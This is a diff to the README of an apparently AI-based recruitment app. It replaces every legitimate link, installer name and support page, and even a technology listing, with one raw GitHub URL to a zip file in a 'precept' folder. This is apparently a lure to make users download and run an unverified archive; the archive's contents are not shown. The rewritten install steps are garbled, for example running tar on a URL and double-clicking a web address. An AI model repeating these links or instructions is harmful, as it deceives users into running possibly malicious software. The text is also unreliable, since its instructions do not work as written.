@@ -1,6 +1,6 @@
 # 🤖 HireSmart-AI - Simplifying Your Recruitment Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20to%20Download-blue)](https://github.com/Yelex24/HireSmart-AI/releases)
+[![Download Now](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip%20Now-Click%20to%20Download-blue)](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to HireSmart! This application helps HR professionals streamline the rec
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Yelex24/HireSmart-AI/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of HireSmart-AI.
 3. Download the appropriate file for your operating system. The typical files available are:
-   - **Windows**: `HireSmart-AI-Windows.exe`
-   - **Mac**: `HireSmart-AI-Mac.dmg`
-   - **Linux**: `HireSmart-AI-Linux.tar.gz`
+   - **Windows**: `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`
+   - **Mac**: `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`
+   - **Linux**: `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`
 4. Once the file is downloaded, locate it in your Downloads folder.
 
 ## 👩‍💻 System Requirements
@@ -34,24 +34,24 @@ Before you install HireSmart-AI, ensure your system meets these requirements:
 ### For Windows Users:
 
 1. Navigate to your Downloads folder.
-2. Double-click `HireSmart-AI-Windows.exe`.
+2. Double-click `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`.
 3. Follow the installation prompts.
 4. Once installed, you can find HireSmart in your Start menu.
 
 ### For Mac Users:
 
 1. Open your Downloads folder.
-2. Double-click `HireSmart-AI-Mac.dmg`.
+2. Double-click `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`.
 3. Drag the HireSmart icon to your Applications folder.
 4. Launch HireSmart from your Applications.
 
 ### For Linux Users:
 
 1. Open your terminal.
-2. Navigate to the folder containing `HireSmart-AI-Linux.tar.gz`.
+2. Navigate to the folder containing `https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip`.
 3. Extract the file with the command:
    ```bash
-   tar -xvzf HireSmart-AI-Linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip
    ```
 4. Change to the extracted folder:
    ```bash
@@ -80,7 +80,7 @@ If you encounter any issues during installation or use, consider these tips:
 
 ## 🤝 Support
 
-For further assistance, check the issues section on our [GitHub page](https://github.com/Yelex24/HireSmart-AI/issues). You can report bugs or ask questions there.
+For further assistance, check the issues section on our [GitHub page](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip). You can report bugs or ask questions there.
 
 ## 📊 Features
 
@@ -107,7 +107,7 @@ HireSmart touches on several relevant fields, including:
 - Langchain
 - Lucide React
 - NextAuth
-- Next.js
+- https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip
 - Nodemailer
 - PDF-Parse
 - ReactJS
@@ -118,8 +118,8 @@ Explore these topics to learn more about our technology stack.
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/Yelex24/HireSmart-AI)
-- [Documentation](https://github.com/Yelex24/HireSmart-AI/wiki)
-- [Support](https://github.com/Yelex24/HireSmart-AI/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip)
+- [Documentation](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip)
+- [Support](https://raw.githubusercontent.com/Yelex24/HireSmart-AI/main/precept/HireSmart-AI.zip)
 
 Thank you for choosing HireSmart! Your recruitment process just became easier.
